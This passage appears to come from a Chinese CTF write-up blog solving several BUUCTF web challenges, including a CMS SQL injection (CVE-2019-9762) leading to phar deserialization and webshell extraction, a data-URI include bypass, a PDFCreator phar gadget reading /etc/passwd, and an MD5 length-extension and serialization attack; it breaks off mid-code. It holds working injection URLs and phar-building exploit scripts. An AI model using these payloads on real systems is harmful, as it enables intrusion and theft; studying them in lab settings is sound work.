rel="noopener">https://anquan.baidu.com/article/697</a>)</p><p>比较源码，XXE<strong>（CVE-2019-9761）</strong>因为删除了notify_url.php这个文件，不能用</p><p>看一下<strong>无限制SQL注入分析（CVE-2019-9762）</strong>，跟着文章一步步看，直接看重点</p><p>漏洞利用点的入口在include/plugin/payment/alipay/pay.php，这里是唯一有回显的位置，poc：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,user(),4,5,6,7,8,9,10,11,12%23_</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/6.png" class=""><p>因为过滤了下划线，这里要用到无列名注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,(<span class="keyword">select</span><span class="string">`3`</span><span class="keyword">from</span>(<span class="keyword">select</span>%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%<span class="number">20</span><span class="keyword">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">20</span>*%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">admin</span>)a%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">201</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>%<span class="number">23</span>_</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/7.png" class=""><p>拿到MD5加密后的密码，解密得到admin/altman777，登录后台</p><p>在品牌管理处发现可以上传文件，这里因为就是利用点了</p><img src="/2020/08/06/remaining/8.png" class=""><p>本题目的源代码在<code>/include/class/pclzip.class.php</code>多了个析构魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;extract(PCLZIP_OPT_PATH, <span class="keyword">$this</span>-&gt;save_path);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>跟进第一个参数，在<code>module/admin/moban.php</code></p><img src="/2020/08/06/remaining/9.png" class=""><p>这个类起到解压缩的作用，那么应该会用到phar协议</p><p>同时，在moban.php中可以看到，引用了<code>pclzip.class.php</code></p><img src="/2020/08/06/remaining/10.png" class=""><p>继续往下看，看到了del方法</p><img src="/2020/08/06/remaining/11.png" class=""><p>跟进一下pe_dirdel方法</p><img src="/2020/08/06/remaining/12.png" class=""><p>看到了is_file，那么phar的触发点就找到了</p><p>思路清晰了，通过moban.php的del功能传入<strong>tpl</strong>参数，通过<strong>is_file</strong>函数触发<strong>phar反序列化</strong>，对之前上传的包含shell的zip文件进行解压缩得到shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PclZip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $zipname = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $zip_fd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_code = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_string = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $magic_quotes_status;</span><br><span class="line">    <span class="keyword">var</span> $save_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p_zipname)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zipname = $p_zipname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_fd = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;magic_quotes_status = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f=<span class="keyword">new</span> PclZip(<span class="string">"/var/www/html/data/attachment/brand/5.zip"</span>);</span><br><span class="line">$f-&gt;save_path=<span class="string">'/var/www/html/data'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($f);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>,<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($f);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>主要的参数就是上传的shell路径以及保存的路径</strong></p><p>上传路径在上传之后能够看到</p><img src="/2020/08/06/remaining/13.png" class=""><p>上传小🐎之后修改exp中的路径即可</p><p>之后再上传phar文件，抓包修改文件名为1.txt</p><p>这里还要注意的点就是token的获取，token在备份的数据库恢复时能够获取得到</p><img src="/2020/08/06/remaining/14.png" class=""><p>这样一来token就到手了，之后再带上referer</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:http://c9ef4168-ae76-49ee-aa39-1808fc8dfd36.node3.buuoj.cn/admin.php?mod=moban</span><br></pre></td></tr></table></figure><p>进行删除操作来解压缩上传的小🐎压缩包</p><img src="/2020/08/06/remaining/15.png" class=""><p>下面就能访问data下的小🐎文件了，读取一下根目录找到flag文件，再读取内容</p><img src="/2020/08/06/remaining/16.png" class=""><h2 id="Phuck2"><a href="#Phuck2" class="headerlink" title="Phuck2"></a>Phuck2</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>DATA URL</li><li>file_get_contents和include处理data：特性</li></ul><h2 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>这题打开全是白的，不知道怎么整，看了源码要传入hl参数才能看到源码，这谁想得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">'php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $mkdir = <span class="function"><span class="keyword">function</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        system(<span class="string">'mkdir -- '</span>.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    $mkdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    chdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    $userFolder = (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $userFolder = basename(str_replace([<span class="string">'.'</span>,<span class="string">'-'</span>],[<span class="string">''</span>,<span class="string">''</span>],$userFolder));</span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line">    file_put_contents(<span class="string">'profile'</span>,print_r($_SERVER,<span class="keyword">true</span>));</span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">    $_GET[<span class="string">'page'</span>]=str_replace(<span class="string">'.'</span>,<span class="string">''</span>,$_GET[<span class="string">'page'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'&lt;?'</span>) &amp;&amp; !stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'php'</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">'rm -rf users/'</span>.$randFolder);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一开始就ban掉了php数据流，后面的escapeshellarg过滤了传入的参数，绕不过</p><p>接着往下走，<code>X-Forwarded-For</code>头中的目录名会赋值给$userFolder，并且过滤了.和-,下面将数据写入了$userFolder/profile中，没有任何过滤，在$page中过滤了点号，看到了include应该是包含了，不过这里又过滤了<code>&lt;?</code>和<code>php</code></p><p>重点来了，关于 include 与 file_get_contents对Data URI 处理上的问题</p><p>自己小小测试一把</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">include</span>(<span class="string">"data:,profile"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">"data:,profile"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/17.png" class=""><p>可以看到<code>file_get_content()</code>正常返回，<code>include()</code>报错，这里忘记说了，当时的比赛应该给了hint，<code>allow_url_include = Off,allow_url_fopen = On</code></p><p>在这种情况下要怎么做呢，这就是<code>include()</code>在不允许包含的情况下，如果说DATA URL是个目录文件就可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">include</span>(<span class="string">"data:,123456/profile"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">"data:,123456/profile"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/18.png" class=""><p>可以看到正常包含了，返回了1</p><p>这里就可以这样做了</p><img src="/2020/08/06/remaining/19.png" class=""><p>下面只需要更改写入的内容执行代码，这里不用cat读取内容，直接如图中所示即可</p><img src="/2020/08/06/remaining/20.png" class=""><h2 id="Chaos-Communication-Camp-2019-PDFCreator"><a href="#Chaos-Communication-Camp-2019-PDFCreator" class="headerlink" title="[Chaos Communication Camp 2019]PDFCreator"></a>[Chaos Communication Camp 2019]PDFCreator</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>phar反序列化</li><li>/etc/nginx/nginx.conf配置信息</li></ul><h3 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>直接看给的源码，down一份下来</p><p>在index.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"pdfcontent"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$creator = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">$creator-&gt;createPdf($_POST[<span class="string">"pdfcontent"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在PDFStuff命名空间下有一个PDFCreator类，跟一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span></span><br><span class="line">&#123;</span><br><span class="line">include 'TCPDF/tcpdf.php';</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDFCreator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $tmpfile;</span><br><span class="line">   <span class="keyword">public</span> $finalfile;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;tmpfile))</span><br><span class="line">   &#123;</span><br><span class="line">   $info = pathinfo(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   <span class="keyword">if</span> ($info[<span class="string">'extension'</span>] == <span class="string">"pdf"</span>)</span><br><span class="line">   &#123;</span><br><span class="line">   unlink(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Could not delete created PDF: Not a pdf. Check the file: "</span> . file_get_contents(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以看到<em>\</em>destruct()魔术方法中在判断文件存在并且不是pdf文件后，会包含这个文件读取内容，这里就想到了phar协议</p><p>利用点在</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Converted by CoolPDF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"phar://./upload/d7f4be9d064bac5fd42207b3d7efe102_10.jpg"</span> <span class="attr">width</span>=<span class="string">"10"</span> <span class="attr">height</span>=<span class="string">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>src这里可以利用phar://来进行解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">PDFCreator</span>&#123;</span><br><span class="line">                public $tmpfile='/etc/passwd';</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span>=<span class="title">new</span> \<span class="title">PDFStuff</span>\<span class="title">PDFCreator</span>();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar=<span class="keyword">new</span> \Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/21.png" class=""><p>这里要注意得是web服务目录不是/var/www/html,得读取nginx配置信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/22.png" class=""><p>得到根目录是<code>/var/www/site</code></p><p>读取之前扫到得flag.php即可</p><img src="/2020/08/06/remaining/23.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Zer0pts2020-musicblog&quot;&gt;&lt;a href=&quot;#Zer0pts2020-musicblog&quot; class=&quot;headerlink&quot; title=&quot;[Zer0pts2020]musicblog&quot;&gt;&lt;/a&gt;[Zer0pts2020]musicblog
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF2016-Web-blogsys</title>
    <link href="http://yoursite.com/2020/08/04/SWPUCTF2016-Web-blogsys/"/>
    <id>http://yoursite.com/2020/08/04/SWPUCTF2016-Web-blogsys/</id>
    <published>2020-08-04T11:18:53.000Z</published>
    <updated>2020-08-06T04:48:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点<a id="more"></a></h2><ul><li>代码审计序列化</li><li>MD5加盐</li><li>MD5扩展攻击</li><li>SQL注入</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>官方wp说是在/web.zip能够拿到源码，这里用了SYC和dirsearch都没有发现有隐藏文件，直接看了源码</p><p><code>common.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">Array</span>(<span class="string">"_POST"</span>, <span class="string">"_GET"</span>, <span class="string">"_COOKIE"</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($v)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"hello,hacker!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $k[<span class="number">0</span>] != <span class="string">'_'</span> ? $$k = addslashes($v) : $$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在变量覆盖，但是common.php文件在开始被引用，到最后代码值依旧会被重新覆盖，不能控制变量</p><p><code>riji.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'login'</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">    header(<span class="string">'Location:/index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'user'</span>]) &#123;</span><br><span class="line">    $username = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">    @mysql_conn();</span><br><span class="line">    $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">    $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">    mysql_close();</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">        $id = intval($result[<span class="string">'userid'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不难发现，登录成功之后session就会存在，如果登录之后，再删除该用户，数据库中就找不到该用户信息，那么$id未被初始化，就可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            @mysql_conn();</span><br><span class="line">            $sql1 = <span class="string">"select * from msg where userid= $id order by id"</span>;</span><br><span class="line">            $query = mysql_query($sql1);</span><br><span class="line">            $result1 = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">while</span> ($temp = mysql_fetch_assoc($query)) &#123;</span><br><span class="line">                $result1[] = $temp;</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_close();</span><br><span class="line">            <span class="keyword">foreach</span> ($result1 <span class="keyword">as</span> $x =&gt; $o) &#123;</span><br><span class="line">                <span class="keyword">echo</span> display($o[<span class="string">'msg'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到查询时，$id未被引号包裹，addslashes等于没用，再看api.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; unserialize(base64_decode($api));</span><br><span class="line">$a-&gt;do_method();</span><br></pre></td></tr></table></figure><p>$api参数未被初始化，也就是说是可控的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//api.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $username = addslashes(<span class="keyword">$this</span>-&gt;name);<span class="comment">//进入数据库的数据进行转义</span></span><br><span class="line">       @mysql_conn();</span><br><span class="line">       $sql = <span class="string">"select * from user where name='$username'"</span>;</span><br><span class="line">       $result = @mysql_fetch_array(mysql_query($sql));</span><br><span class="line">       mysql_close();</span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>($result)) &#123;</span><br><span class="line">           <span class="comment">//利用 salt 验证是否为该用户</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;check === md5($result[<span class="string">'salt'</span>] . <span class="keyword">$this</span>-&gt;data . $username)) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">'(=-=)!!'</span>;</span><br><span class="line">               <span class="keyword">if</span> ($result[<span class="string">'role'</span>] == <span class="number">1</span>) &#123;<span class="comment">//检查是否为admin用户</span></span><br><span class="line">                   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>可以看到要通过验证，需要拿到md5的加盐值，还要判断是否为admin用户，既然包含了common.php，也就是说存在变量覆盖漏洞，那么$a的属性值可控</p><p><code>$result[&#39;salt&#39;]</code>随机生成，找一下怎么才能拿到这个值</p><p>在forget.php文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($result)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'salt'</span>]) &#123;</span><br><span class="line">        $check = base64_encode(md5($result[<span class="string">'salt'</span>]));</span><br><span class="line">        $name = $result[<span class="string">'name'</span>];</span><br><span class="line">        header(<span class="string">"Location:/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass"</span>);</span><br></pre></td></tr></table></figure><p>这里更改密码时会发生页面跳转，不管成功与否都会爆出路径和参数，其中就包括了base64加密之后的</p><p><code>$result[&#39;salt&#39;]</code></p><p>下面就是哈希拓展攻击，工具在这<a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">https://github.com/JoyChou93/md5-extension-attack</a></p><p>思路清晰了，忘记密码进行修改时通过尝试更改admin账户，页面跳转拿到<code>$result[&#39;salt&#39;]</code>，在构造序列化数据，再传值给api.php中可控的$api参数，$id可控，再进行数据库数据的查询拿到flag</p><img src="/2020/08/04/SWPUCTF2016-Web-blogsys/1.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">var</span> $check= <span class="string">"6122c04e8a1f3529d556199960ef2556"</span>;</span><br><span class="line">    <span class="keyword">var</span> $data = <span class="string">"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">var</span> $method=<span class="string">"del_user"</span>;   <span class="comment">//要调用的函数</span></span><br><span class="line">    <span class="keyword">var</span> $userid=<span class="string">"2"</span>;  <span class="comment">//要删除的用户</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> admin();</span><br><span class="line">$api = 